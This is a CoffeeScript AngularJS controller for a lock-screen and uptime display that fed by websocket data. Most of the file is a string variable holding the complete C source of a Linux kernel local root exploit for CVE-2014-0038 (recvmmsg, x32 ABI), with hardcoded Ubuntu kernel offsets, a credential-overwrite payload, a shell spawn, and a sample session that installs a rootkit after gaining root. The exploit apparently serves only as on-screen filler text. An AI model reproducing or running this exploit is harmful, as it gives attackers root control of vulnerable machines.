'use strict'

ide_text = '
\n
/*\n
*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*\n
recvmmsg.c - linux 3.4+ local root (CONFIG_X86_X32=y)\n
CVE-2014-0038 / x32 ABI with recvmmsg\n
by rebel @ irc.smashthestack.org\n
-----------------------------------\n
\n
takes about 13 minutes to run because timeout->tv_sec is decremented\n
once per second and 0xff*3 is 765.\n
\n
some things you could do while waiting:\n
  * watch http://www.youtube.com/watch?v=OPyZGCKu2wg 3 times\n
  * read https://wiki.ubuntu.com/Security/Features and smirk a few times\n
  * brew some coffee\n
  * stare at the countdown giggly with anticipation\n
\n
  could probably whack the high bits of some pointer with nanoseconds,\n
  but that would require a bunch of nulls before the pointer and then\n
  reading an oops from dmesg which isn\'t that elegant.\n
\n
  &net_sysctl_root.permissions is nice because it has 16 trailing nullbytes\n
\n
  hardcoded offsets because I only saw this on ubuntu & kallsyms is protected\n
  anyway..\n
\n
  same principle will work on 32bit but I didn\'t really find any major\n
  distros shipping with CONFIG_X86_X32=y\n
  \n
  user@ubuntu:~$ uname -a\n
  Linux ubuntu 3.11.0-15-generic #23-Ubuntu SMP Mon Dec 9 18:17:04 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux\n
  user@ubuntu:~$ gcc recvmmsg.c -o recvmmsg\n
  user@ubuntu:~$ ./recvmmsg\n
  byte 3 / 3.. ~0 secs left.\n
  w00p w00p!\n
  # id\n
  uid=0(root) gid=0(root) groups=0(root)\n
  # sh phalanx-2.6b-x86_64.sh\n
  unpacking..\n
\n
  :)=\n
\n
    greets to my homeboys kaliman, beist, capsl & all of #social\n
\n
        Sat Feb  1 22:15:19 CET 2014\n
  % rebel %\n
    *=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*\n
  */\n
\n
#define _GNU_SOURCE\n
#include <netinet/ip.h>\n
#include <stdio.h>\n
#include <stdlib.h>\n
#include <string.h>\n
#include <sys/socket.h>\n
#include <unistd.h>\n
#include <sys/syscall.h>\n
#include <sys/mman.h>\n
#include <sys/types.h>\n
#include <sys/stat.h>\n
#include <fcntl.h>\n
#include <sys/utsname.h>\n
\n
#define __X32_SYSCALL_BIT 0x40000000\n
#undef __NR_recvmmsg\n
#define __NR_recvmmsg (__X32_SYSCALL_BIT + 537)\n
#define VLEN 1\n
#define BUFSIZE 200\n
\n
int port;\n
\n
struct offset {\n
    char *kernel_version;\n
    unsigned long dest; // net_sysctl_root + 96\n
    unsigned long original_value; // net_ctl_permissions\n
    unsigned long prepare_kernel_cred;\n
    unsigned long commit_creds;\n
};\n
\n
struct offset offsets[] = {\n
        {"3.11.0-15-generic",0xffffffff81cdf400+96,0xffffffff816d4ff0,0xffffffff8108afb0,0xffffffff8108ace0}, // Ubuntu 13.10\n
        {"3.11.0-12-generic",0xffffffff81cdf3a0,0xffffffff816d32a0,0xffffffff8108b010,0xffffffff8108ad40}, // Ubuntu 13.10\n
        {"3.8.0-19-generic",0xffffffff81cc7940,0xffffffff816a7f40,0xffffffff810847c0, 0xffffffff81084500}, // Ubuntu 13.04\n
        {NULL,0,0,0,0}\n
};\n
\n
void udp(int b) {\n
    int sockfd;\n
    struct sockaddr_in servaddr,cliaddr;\n
    int s = 0xff+1;\n
\n
    if(fork() == 0) {\n
        while(s > 0) {\n
            fprintf(stderr,"\rbyte %d / 3.. ~%d secs left    \b\b\b\b",b+1,3*0xff - b*0xff - (0xff+1-s));\n
            sleep(1);\n
            s--;\n
            fprintf(stderr,".");\n
        }\n
\n
        sockfd = socket(AF_INET,SOCK_DGRAM,0);\n
        bzero(&servaddr,sizeof(servaddr));\n
        servaddr.sin_family = AF_INET;\n
        servaddr.sin_addr.s_addr=htonl(INADDR_LOOPBACK);\n
        servaddr.sin_port=htons(port);\n
        sendto(sockfd,"1",1,0,(struct sockaddr *)&servaddr,sizeof(servaddr));\n
        exit(0);\n
    }\n
\n
}\n
\n
void trigger() {\n
    open("/proc/sys/net/core/somaxconn",O_RDONLY);\n
\n
    if(getuid() != 0) {\n
        fprintf(stderr,"not root, ya blew it!\");\n
        exit(-1);\n
    }\n
\n
    fprintf(stderr,"w00p w00p!\");\n
    system("/bin/sh -i");\n
}\n
\n
typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);\n
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);\n
_commit_creds commit_creds;\n
_prepare_kernel_cred prepare_kernel_cred;\n
\n
// thx bliss\n
static int __attribute__((regparm(3)))\n
getroot(void *head, void * table)\n
{\n
    commit_creds(prepare_kernel_cred(0));\n
    return -1;\n
}\n
\n
void __attribute__((regparm(3)))\n
trampoline()\n
{\n
    asm("mov $getroot, %rax; call *%rax;");\n
}\n
\n
int main(void)\n
{\n
    int sockfd, retval, i;\n
    struct sockaddr_in sa;\n
    struct mmsghdr msgs[VLEN];\n
    struct iovec iovecs[VLEN];\n
    char buf[BUFSIZE];\n
    long mmapped;\n
    struct utsname u;\n
    struct offset *off = NULL;\n
\n
    uname(&u);\n
\n
    for(i=0;offsets[i].kernel_version != NULL;i++) {\n
        if(!strcmp(offsets[i].kernel_version,u.release)) {\n
            off = &offsets[i];\n
            break;\n
        }\n
    }\n
\n
    if(!off) {\n
        fprintf(stderr,"no offsets for this kernel version..\");\n
        exit(-1);\n
    }\n
\n
    mmapped = (off->original_value  & ~(sysconf(_SC_PAGE_SIZE) - 1));\n
    mmapped &= 0x000000ffffffffff;\n
\n
    srand(time(NULL));\n
    port = (rand() % 30000)+1500;\n
\n
    commit_creds = (_commit_creds)off->commit_creds;\n
    prepare_kernel_cred = (_prepare_kernel_cred)off->prepare_kernel_cred;\n
\n
    mmapped = (long)mmap((void *)mmapped, sysconf(_SC_PAGE_SIZE)*3, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, 0, 0);\n
\n
    if(mmapped == -1) {\n
        perror("mmap()");\n
        exit(-1);\n
    }\n
\n
    memset((char *)mmapped,0x90,sysconf(_SC_PAGE_SIZE)*3);\n
\n
    memcpy((char *)mmapped + sysconf(_SC_PAGE_SIZE), (char *)&trampoline, 300);\n
\n
    if(mprotect((void *)mmapped, sysconf(_SC_PAGE_SIZE)*3, PROT_READ|PROT_EXEC) != 0) {\n
        perror("mprotect()");\n
        exit(-1);\n
    }\n
\n
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);\n
    if (sockfd == -1) {\n
        perror("socket()");\n
        exit(-1);\n
    }\n
\n
    sa.sin_family = AF_INET;\n
    sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);\n
    sa.sin_port = htons(port);\n
\n
    if (bind(sockfd, (struct sockaddr *) &sa, sizeof(sa)) == -1) {\n
        perror("bind()");\n
        exit(-1);\n
    }\n
\n
    memset(msgs, 0, sizeof(msgs));\n
\n
    iovecs[0].iov_base = &buf;\n
    iovecs[0].iov_len = BUFSIZE;\n
    msgs[0].msg_hdr.msg_iov = &iovecs[0];\n
    msgs[0].msg_hdr.msg_iovlen = 1;\n
\n
    for(i=0;i < 3 ;i++) {\n
        udp(i);\n
        retval = syscall(__NR_recvmmsg, sockfd, msgs, VLEN, 0, (void *)off->dest+7-i);\n
        if(!retval) {\n
            fprintf(stderr,"\recvmmsg() failed\");\n
        }\n
    }\n
\n
    close(sockfd);\n
\n
    fprintf(stderr,"\");\n
\n
    trigger();\n
}\n
'

angular
  .module('appControllers')
  .controller 'lockCtrl', ['$scope', 'ngSocket'
  ($scope, ngSocket) ->
    vm = this
    vm.uptime_total = 0
    vm.uptime_idle = 0
    vm.lock = 0
    vm.lock_const = 0
    vm.total_work = 0
    vm.total_idle = 0
    vm.unlock_wait = 0
    vm.ide_text = ide_text
    vm.options =
      e: 0.04,
      t: 100
    vm.ide_callback = ()->
      console.log 'callback'

    $scope.ide_text_type = ""
    port = document.location.port
    protocol = if document.location.protocol == "https:" then "wss:" else "ws:"
    ws = ngSocket(protocol+"//"+document.domain+":"+port+"/ws")

    toSeconds = (val)->
      if val?
        val / 1000000000

    toHumanTime = (sec_num)->

      time = ''
      if sec_num < 0
        sec_num *= -1
        time += '-'

      hours   = Math.floor(sec_num / 3600)
      minutes = Math.floor((sec_num - (hours * 3600)) / 60)
      seconds = sec_num - (hours * 3600) - (minutes * 60)

      if hours < 10
        hours = '0' + hours

      if minutes < 10
        minutes = '0' + minutes

      if seconds < 10
        seconds = '0' + seconds

      if hours != '00'
        time += hours+ 'h'

      time += minutes + 'm' + seconds + 's'

      time

    ws.onMessage (message)=>

      data = angular.fromJson(message.data)

      if data.uptime_total?
        vm.uptime_total = data.uptime_total

      if data.uptime_idle?
        vm.uptime_idle = data.uptime_idle

      if data.timeinfo?
        if data.timeinfo['lock']?
          vm.lock = toHumanTime(toSeconds(data.timeinfo['lock']))

        if data.timeinfo.lock_const?
          vm.lock_const = toHumanTime(toSeconds(data.timeinfo.lock_const))

        if data.timeinfo.total_work?
          vm.total_work = toHumanTime(toSeconds(data.timeinfo.total_work))

        if data.timeinfo.total_idle?
          vm.total_idle = toHumanTime(toSeconds(data.timeinfo.total_idle))

        if data.timeinfo.lock_const && data.timeinfo.lock?
          vm.unlock_wait = toHumanTime(toSeconds(data.timeinfo.lock_const - data.timeinfo.lock))
  ]